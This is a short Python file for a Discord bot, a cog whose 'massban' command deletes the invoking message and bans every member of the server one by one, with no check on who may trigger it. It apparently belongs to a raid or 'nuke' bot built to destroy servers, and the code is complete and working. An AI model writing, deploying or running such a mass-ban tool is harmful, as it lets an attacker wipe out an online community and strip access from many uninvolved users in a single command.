from discord.ext import commands
import main
import discord

class massban(commands.Cog):
    def __init__(self, client):
        self.client = client
        self.command_info = {
            "massban": "bans everyone",
        }
        
        self.category = "admin"
    @commands.command()
    async def massban(self, ctx):
        await ctx.message.delete()
        users = list(ctx.guild.members)
        for user in users:
            try:
                await user.ban(reason=main.massBan_reason)
            except discord.Forbidden:
                await ctx.send(f'Massban > 403 Forbidden!')
                return
            except discord.HTTPException:
                await ctx.send(f'Massban > HTTPException!')
                return

async def setup(client):
        await client.add_cog(massban(client))